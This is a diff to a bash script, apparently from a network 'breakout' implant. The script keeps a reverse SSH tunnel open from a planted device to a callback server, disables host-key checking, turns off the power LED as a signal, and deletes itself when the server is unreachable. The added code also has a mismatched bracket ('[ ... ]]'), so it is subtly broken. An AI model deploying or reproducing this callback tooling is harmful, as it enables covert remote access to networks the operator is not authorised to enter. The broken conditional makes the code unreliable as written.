@@ -1,6 +1,6 @@
 #!/bin/bash
 #title                  :checkSSH.sh
-#description            :This script will verify that the SSH Tunnel to the callback server is up. 
+#description            :This script will verify that the SSH Tunnel to the callback server is up.
 #author                 :Robin Lennox
 #==============================================================================
 
@@ -11,11 +11,22 @@ callbackPort='SET_PORT'
 tunnelType='TUNNEL_TYPE'
 gatewayWifi='GATEWAY_WIFI'
 checkSSHTunnel=$(sudo netstat -tnpa | grep 'ESTABLISHED.*ssh ' | grep ${callbackIP})
+checkRunningState=$(ps -eo command | grep "^bash" | grep checkSSH.sh | wc -l)
+checkPortOpen=$(nc -z -v -w10 ${callbackIP} ${callbackPort} 2>&1)
 
-if [ -z "${checkSSHTunnel}" ]; then
-	sudo ssh -f -N -R ${randomPort}:localhost:22 ${sshUser}@${callbackIP} -p${callbackPort} -oStrictHostKeyChecking=no -i /home/${sshUser}/.ssh/id_rsa
+if [ "${checkRunningState}" -lt 3 ]; then
+    if [[ "${checkPortOpen}" == *"succeeded"* ]; then
+        if [ -z "${checkSSHTunnel}" ]]; then
+            sudo ssh -f -N -R ${randomPort}:localhost:22 ${sshUser}@${callbackIP} -p${callbackPort} -oStrictHostKeyChecking=no -i /home/${sshUser}/.ssh/id_rsa &>/dev/null
+            # Turn Off Power LED to indicate that SSH Tunnel Created
+            sudo sh -c 'echo gpio >/sys/class/leds/led1/trigger'
+            echo "[+] Tunnel Created."
+        fi
+    else
+        echo "[x] Tunnel Closed, removing checkSSH.sh."
+        rm -rf /opt/breakout/lib/checkSSH.sh
+    fi
+else
+    echo "[x] Already checkSSH already running."
 fi
-
 sudo sh /opt/breakout/lib/customMOTD.sh /etc/motd
-
-
